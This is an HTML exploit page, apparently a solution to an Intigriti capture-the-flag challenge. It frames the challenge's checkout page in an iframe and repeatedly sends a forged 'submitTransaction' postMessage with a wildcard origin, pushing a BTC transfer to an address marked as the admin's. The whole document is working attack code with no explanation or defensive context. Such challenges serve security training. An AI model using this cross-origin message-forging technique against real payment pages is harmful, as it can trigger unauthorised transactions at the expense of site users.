<!DOCTYPE html>
<html>
<body>
    <iframe id="target" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1000000" width="100%" height="500px"></iframe>
    <script>
        const ifr = document.getElementById('target');
        
        // Wait for iframe to load, then blast the postMessage
        setTimeout(() => {
            const exploit = {
                type: 'submitTransaction',
                transaction: {
                    toAddress: '1647db76b716157f954c706f74641a756f', // Admin Address
                    currency: 'BTC',
                    amount: 0.000001
                }
            };
            
            // Send it multiple times in case of race conditions
            for(let i=0; i<10; i++) {
                setTimeout(() => {
                    ifr.contentWindow.postMessage(exploit, '*');
                }, i * 500);
            }
        }, 5000);
    </script>
</body>
</html>
